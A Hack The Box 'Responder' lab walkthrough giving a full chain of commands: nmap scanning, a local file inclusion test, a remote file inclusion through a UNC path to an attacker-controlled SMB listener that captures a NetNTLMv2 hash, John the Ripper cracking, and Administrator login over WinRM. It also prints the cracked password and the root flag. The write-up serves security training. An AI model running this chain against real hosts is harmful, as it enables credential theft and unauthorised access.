
# HTB Starting Point – Responder Walkthrough

**Difficulty:** Easy  
**Category:** Web, Windows, Network  
**Objective:** Exploiting a file inclusion vulnerability to capture and crack NTLMv2 credentials, then gaining administrative access via WinRM  

---

## 📝 Summary

This machine demonstrates a full exploitation chain involving Local File Inclusion (LFI), Remote File Inclusion (RFI) via SMB, NetNTLMv2 hash capture using Responder, offline password cracking with John the Ripper, and post-exploitation access via WinRM.

The scenario simulates a misconfigured web application vulnerable to file inclusion and a Windows host exposing WinRM, providing an opportunity to escalate from low-level web access to full system compromise.

---

## 🔍 Initial Enumeration

### Nmap Scan
```bash
nmap -sC -sV -p- 10.129.9.6
````

**Open Ports:**

* `80/tcp` – Apache httpd
* `5985/tcp` – Microsoft WinRM

---

## 🌐 Web Application Analysis

### Hostname Resolution

Ensure `/etc/hosts` contains:

```
10.129.9.6 unika.htb
```

### LFI Discovery

The application includes pages via a `page` parameter:

```http
http://unika.htb/?page=about
```

Tested LFI:

```bash
curl -H "Host: unika.htb" "http://10.129.9.6/?page=../../../../../../../../windows/system32/drivers/etc/hosts"
```

✔️ Successful inclusion confirms **Local File Inclusion**.

---

## 💀 RFI + SMB Hash Capture (Responder)

### 1. Start Responder on VPN Interface:

```bash
sudo responder -I tun0
```

### 2. Trigger RFI via UNC path:

```bash
curl -H "Host: unika.htb" "http://10.129.9.6/?page=//10.10.14.253/fake"
```

Responder captures a **NetNTLMv2 challenge/response**:

```
Administrator::Responder:112233...:NetNTLMv2_hash
```

---

## 🔐 Hash Cracking with John the Ripper

### Save hash to file:

```bash
nano hash.txt
```

### Crack using rockyou:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked Password:**

```
badminton
```

---

## 🪟 Gaining Access via WinRM

### Using `evil-winrm`:

```bash
evil-winrm -i 10.129.9.6 -u Administrator -p badminton
```

> Note: Ruby configuration issues may affect this tool. If so, alternative options like `crackmapexec` can be used.

### Using `crackmapexec`:

```bash
crackmapexec winrm 10.129.9.6 -u Administrator -p badminton -x "type C:\\Users\\mike\\Desktop\\root.txt"
```

---

## 🏁 Root Flag

Once inside:

```powershell
cd C:\Users\mike\Desktop
type root.txt
```

**Root Flag:**

```
ea81b7afddd03efaa0945333ed147fac
```

---

## 📚 Key Takeaways

* **LFI can lead to RFI** in Windows environments when UNC paths are included without validation.
* **Responder** is highly effective for capturing NTLM hashes when file includes or redirects trigger SMB authentication.
* **John the Ripper** can crack NetNTLMv2 hashes with a proper wordlist (e.g. rockyou).
* **WinRM** is a commonly exposed Windows management service that, if misconfigured, provides shell access.
* Working with tools like `evil-winrm`, `Responder`, and `crackmapexec` highlights the importance of solid environment setup and fallback strategies during engagements.

---

## 🛠 Tools Used

| Tool           | Purpose                              |
| -------------- | ------------------------------------ |
| `nmap`         | Service and port discovery           |
| `Responder`    | Capturing NTLMv2 challenge/responses |
| `curl`         | Manual LFI/RFI testing               |
| `john`         | Offline hash cracking                |
| `evil-winrm`   | Windows remote shell                 |
| `crackmapexec` | Alternative WinRM exploitation       |

---

## 📁 Supporting Files

* `hash.txt` – Captured NTLMv2 hash
* `rockyou.txt` – Wordlist for cracking
* `screenshot/` – Optional proof images for each stage

---

## 🎯 Conclusion

This machine demonstrates the risks associated with improper input validation and file inclusion in web applications, especially when paired with exposed internal services like SMB and WinRM.

The box also reinforces fundamental offensive security concepts such as:

* Hash capture and cracking
* Enumeration of file inclusion vulns
* Credential reuse across services

proof of pwn - https://labs.hackthebox.com/achievement/machine/2424577/461
> **Note:** This writeup is intended for educational and career development purposes and reflects a responsible, legal penetration testing exercise performed within Hack The Box’s training environment.

